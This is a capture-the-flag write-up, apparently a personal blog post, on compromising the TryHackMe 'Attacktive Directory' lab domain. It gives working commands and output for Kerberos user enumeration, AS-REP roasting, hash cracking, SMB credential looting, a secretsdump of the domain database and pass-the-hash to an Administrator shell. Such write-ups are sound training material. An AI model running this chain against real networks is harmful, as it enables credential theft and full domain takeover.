---
layout: blog
title: TryHackMe Attacktive Directory Writeup
publishDate: 2025-07-01T22:01:00.000Z
description: Learning AD exploitation through enumeration, AS-REProasting, and
  privilege escalation.
tags:
  - tryhackme
  - writeup
  - active-directory
---
In this room, I was given an IP address, which, after scanning, revealed that the machine was part of an Active Directory domain. By enumerating the users on the domain, I had to find a specific user that allowed me to exploit the system without a password using AS-REP Roasting. Once I retrieved the password hash, I was able to list all SMB shares on the domain. In one of these shares, I found the credentials for another special user on the domain. I then exploited this user to escalate privileges and retrieve all the flags.

## Enumeration

### Nmap

```sh
Initiating SYN Stealth Scan at 03:14
Scanning 10.10.239.33 [27 ports]
Discovered open port 139/tcp on 10.10.239.33
Discovered open port 3389/tcp on 10.10.239.33
Discovered open port 53/tcp on 10.10.239.33
Discovered open port 445/tcp on 10.10.239.33
Discovered open port 80/tcp on 10.10.239.33
Discovered open port 135/tcp on 10.10.239.33
Discovered open port 464/tcp on 10.10.239.33
Discovered open port 49669/tcp on 10.10.239.33
Discovered open port 49673/tcp on 10.10.239.33
Discovered open port 593/tcp on 10.10.239.33
Discovered open port 49822/tcp on 10.10.239.33
Discovered open port 389/tcp on 10.10.239.33
Discovered open port 5985/tcp on 10.10.239.33
Discovered open port 49679/tcp on 10.10.239.33
Discovered open port 47001/tcp on 10.10.239.33
Discovered open port 88/tcp on 10.10.239.33
Discovered open port 9389/tcp on 10.10.239.33
Discovered open port 3269/tcp on 10.10.239.33
Discovered open port 49664/tcp on 10.10.239.33
Discovered open port 49676/tcp on 10.10.239.33
Discovered open port 49666/tcp on 10.10.239.33
Discovered open port 49687/tcp on 10.10.239.33
Discovered open port 49665/tcp on 10.10.239.33
Discovered open port 3268/tcp on 10.10.239.33
Discovered open port 49675/tcp on 10.10.239.33
Discovered open port 49701/tcp on 10.10.239.33
Discovered open port 636/tcp on 10.10.239.33
Completed SYN Stealth Scan at 03:14, 0.46s elapsed (27 total ports)
Initiating Service scan at 03:14
Scanning 27 services on 10.10.239.33

Initiating NSE at 03:15
Completed NSE at 03:15, 0.00s elapsed
Nmap scan report for 10.10.239.33
Host is up, received echo-reply ttl 127 (0.24s latency).
Scanned at 2025-06-30 03:14:11 EDT for 76s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-30 07:14:18Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
_ssl-date: 2025-06-30T07:15:19+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-30T07:15:10+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Host script results:
| smb2-time:
|   date: 2025-06-30T07:15:12
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 39405/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 9503/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45485/udp): CLEAN (Failed to receive data)
|   Check 4 (port 40191/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and **required**
```

- Multiple open ports find: 53, 80, 88, 135, 139, 389, 445, 3268, 3389, etc.
- NetBIOS domain name is `THM-AD`.
- AD domain is `spookysec.local`.

### Enumerating users via Kerberos

From the Nmap scan report, it can be observed that the machine is part of an Active Directory domain "spookysec.local".

I downloaded the latest release of kerbrute from the [GitHub repository](https://github.com/ropnop/kerbrute). This tool is useful to enumerate users on an AD domain.

Before using kerbrute I added the domain name in the `/etc/hosts` file:

```sh
# /etc/hosts

...
<machine-ip>    spookysec.local
```

Using the `userenum` option, I enumerated the users on the domain `spookysec.local`.

```sh
> ./kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local userlist.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 06/30/25 - Ronnie Flathers @ropnop

2025/06/30 03:31:18 >  Using KDC(s):
2025/06/30 03:31:18 >   spookysec.local:88

2025/06/30 03:31:19 >  [+] VALID USERNAME:       james@spookysec.local
2025/06/30 03:31:24 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/06/30 03:31:29 >  [+] VALID USERNAME:       James@spookysec.local
2025/06/30 03:31:31 >  [+] VALID USERNAME:       robin@spookysec.local
2025/06/30 03:31:59 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/06/30 03:32:14 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/06/30 03:32:48 >  [+] VALID USERNAME:       backup@spookysec.local
2025/06/30 03:33:03 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/06/30 03:34:29 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/06/30 03:34:58 >  [+] VALID USERNAME:       Robin@spookysec.local
```

- The users `svc-admin` and `backup` are notable.

### AS-REProasting

AS-REProasting is the method of exploiting users which does not have kerberos pre-authentication enabled, so you can steal the password hashes without needing to authenticate.

First, I created a list of user list from the discovered users in the previous step.

Impacket has a tool called "GetNPUsers.py" (located in `impacket/examples/GetNPUsers.py`) that allows to query AS-REProastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

```sh
> impacket-GetNPUsers -no-pass -usersfile users spookysec.local/
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0e368f3f1b9afe87a7f8dab6be46f4e7$0ce23f68452d75c6310db1e7c160564b95f854a69223f63cfc1d36d2472e49f01727ec846b55e900275688b437c8e79fc564dd766b93b00fc70d142ab983cef852250d787fa69a4efc89ade7f7ea5426742eca0aea18f239e652a486026e4d9dc66453605991d99a35373c55c8341d758d42e90b649d9ed464de283746bdb1c35d5335a03b4c79048a65ab76753c5021427fcf9489091e560a72ebd4952e5bef195810ad1d29e1309e8fbe2fa8a07a527fcb3afadc20b6bf03ad31eeeb5fd3471f69727fa7ad0d637c11a3ee54915620b7907cfe1bc36d6510ba4a117d8671fa0ce86c06b505f4492db8bf868bb0794b38a9
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- From the hashcat wiki, I found that this is a "Kerberos 5, etype 23, AS-REP" hash (mode 18200).

### Cracking the hash

```sh
> hashcat -a0 -m 18200 hash passwordlist.txt
...
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0e368f3f1b9afe87a7f8dab6be46f4e7$0ce23f68452d75c6310db1e7c160564b95f854a69223f63cfc1d36d2472e49f01727ec846b55e900275688b437c8e79fc564dd766b93b00fc70d142ab983cef852250d787fa69a4efc89ade7f7ea5426742eca0aea18f239e652a486026e4d9dc66453605991d99a35373c55c8341d758d42e90b649d9ed464de283746bdb1c35d5335a03b4c79048a65ab76753c5021427fcf9489091e560a72ebd4952e5bef195810ad1d29e1309e8fbe2fa8a07a527fcb3afadc20b6bf03ad31eeeb5fd3471f69727fa7ad0d637c11a3ee54915620b7907cfe1bc36d6510ba4a117d8671fa0ce86c06b505f4492db8bf868bb0794b38a9:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0e368f3f1b9...4b38a9
Time.Started.....: Mon Jun 30 04:00:30 2025 (0 secs)
Time.Estimated...: Mon Jun 30 04:00:30 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   516.8 kH/s (1.65ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/70188 (11.67%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/70188 (5.84%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> whitey
Hardware.Mon.#1..: Util: 16%

Started: Mon Jun 30 04:00:19 2025
Stopped: Mon Jun 30 04:00:31 2025
```

- Password: `management2005`

### Enumerating SMB shares

Now that I have the password for the `svc-admin` user, I could list all the shares on the DC `spookysec.local`. To enumerate SMB shares, I used `netexec`:

```sh
> netexec smb 10.10.239.33 -u svc-admin -p "management2005" --shares
[*] Initializing SMB protocol database
SMB         10.10.239.33    445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.239.33    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
SMB         10.10.239.33    445    ATTACKTIVEDIREC  [*] Enumerated shares
SMB         10.10.239.33    445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.239.33    445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.239.33    445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.239.33    445    ATTACKTIVEDIREC  backup          READ
SMB         10.10.239.33    445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.239.33    445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.239.33    445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share
SMB         10.10.239.33    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share
```

- The backup share has read access.

Using `smbclient`, I authenticated to the `backup` share as the `svc-admin` user to find any backed up information which might contain passwords.

```sh
> smbclient //10.10.239.33/backup -U svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3646401 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

- A file named `backup_credentials.txt` was stored. I downloaded the file from the SMB share to see the contents.

Decoding the hash:

```sh
> base64 -d backup_credentials.txt
backup@spookysec.local:backup2517860
```

- I got the credentials for the `backup` user.
## Privilege Escalation

The backup user in a domain controller has special permissions which allow all changes in the domain to be synced with this user account. So, I could dump all secrets of all users on the domain that are synced with the backup user using impacket's secretsdump script. This script finds all secrets from the `ntds.dit` file. All information related to objects in the domain are stored in this file which is the primary database file within AD DS.

```sh
> impacket-secretsdump -target-ip 10.10.162.18 spookysec.local/backup:backup2517860@10.10.162.18
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
...
```

Running the script, I got all the secrets of all the users on the domain, among which was the NTLM hash of the `Administrator` user. Using the hash, I could easily execute a "pass-the-hash" attack using Evil-WinRM to get the admin shell:

```sh
> evil-winrm -i 10.10.162.18 -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'
```

The final task of this room was to find the flags of the three users that I came across - `svc-admin`, `backup`, `Administrator`. The flags were in the Deskop of each user.
